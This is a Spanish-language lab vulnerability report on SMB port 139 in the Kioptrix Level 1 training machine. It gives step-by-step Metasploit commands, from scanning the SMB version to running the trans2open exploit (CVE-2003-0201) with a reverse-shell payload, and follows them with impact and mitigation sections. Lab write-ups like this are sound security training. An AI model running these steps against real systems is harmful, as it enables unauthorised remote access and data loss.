#  Vulnerabilidad en puerto 139 / protocolo smb

### Descripción
SMB (Server Message Block) es un protocolo cliente-servidor que controla el acceso a archivos y directorios enteros, así como a otros recursos de la red, como impresoras, routers o interfaces compartidas con la red. Una vulneración a este protocolo podría significar el acceso no autorizado de un usuario y la perdida o alteración de información valiosa.

### Sistema Vulnerable
El problema fue identificado y probado en Kioptrix level 1

### Gravedad del problema
Alta

### Reproducción
1.  Obtener  versión del protocolo smb
  - Acceder a la consola de metasploit a través del comando msfconsole en la terminal
  - Ejecutar el módulo smb_version el comando “use auxiliary/scanner/smb/smb_version” 
  - Verificar los parámetros que se necesitan establecer ejecutando la función “options” 
  - Establecer la ip destino en RHOSTS ejecutando “set RHOSTS” más la ip de kioptrix
  - Ejecutar el comando “run” para obtener la versión del protocolo smb 

2. Establecer conexión con el protocolo smb
  - Modificar el archivo smb.conf ejecutando el comando “sudo nano /etc/samba/smb.conf 
  - Al final del grupo global escribir “client min protocol = NT1” y guardamos con ctrl + o 
  - Reiniciar servicio samba ejecutando el comando “sudo service smbd restart” 
  - Establecer conexión con el comando “smbclient -L \\\\ip de kioptix\\” y presionar enter cuando solicite password 
 
3. Exploit 
  - Acceder a la consola de metasploit a través del comando msfconsole
  - Buscar modulo trans2open ejecutando “search trans2open”
  - Poner en uso el modulo trans2open ejecutando “use” más el número del módulo que coincide con el sistema de kioptrix, Linux
  - Establecer la ip destino en RHOSTS ejecutando “set RHOSTS” más la ip de kioptrix 
  - Establecer el payload con el comando “set payload linux/x86/shell_reverse_tcp
  - Ejecutar comando exploit

### Impacto
Un atacante puede abusar de la vulnerabilidad encontrada y escalar privilegios para llevar a cabo un ataque de denegación de servicio contra el sistema vulnerable con el fin de bloquear el servicio para el que está destinado. Este ataque puede afectar, tanto a la fuente que ofrece la información como puede ser una aplicación o el canal de transmisión, así como a la red. En las redes, el peligro de un ataque basado en el protocolo SMB es particularmente alto, ya que, por motivos de compatibilidad, en la red suelen estar activadas todas las versiones de SMB, porque así lo requieren las impresoras u otros dispositivos de red conectados. También es importante tener en cuenta que la información que se encuentra en el sistema vulnerable queda expuesta al atacante y se corre el riesgo de perderla.

### Mitigación
- Bloquear el acceso a los puertos SMB desde redes que no sean de confianza.
- Bloquear el acceso a los puertos tcp / 445 y tcp / 139 en el perímetro de la red evitará ataques de partes que no sean de confianza. Sin embargo, esta no es una solución viable para el medio ambiente donde se necesitan servicios de archivos e impresión para usuarios legítimos.

### Referencias
- https://nvd.nist.gov/vuln/detail/CVE-2003-0201
- https://www.ionos.es/digitalguide/servidores/know-how/server-message-block-smb/
